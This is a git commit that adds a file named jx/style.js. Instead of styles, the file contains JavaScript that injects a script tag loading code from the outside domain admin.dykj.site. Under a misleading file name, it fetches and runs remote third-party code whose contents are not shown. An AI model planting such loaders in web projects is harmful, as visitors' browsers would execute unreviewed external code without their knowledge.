2e91997ff1fb13552c111520b1cb21e7f5428f99
sysh8888 <sysh8888@126.com>
2021-11-20 15:34:14 +0800

    Add files via upload

---
+++ jx/style.js
@@ -0,0 +1,10 @@
+
+
+ (function() {  var hi = document.createElement("script"); 
+ hi.src = "https://admin.dykj.site/olcg/c608775637d24abd/o.js"; 
+ hi.charset = "UTF-8"; 
+ var k = document.getElementsByTagName("script")[0]; 
+ k.parentNode.insertBefore(hi, k);
+ })();
+ 
+
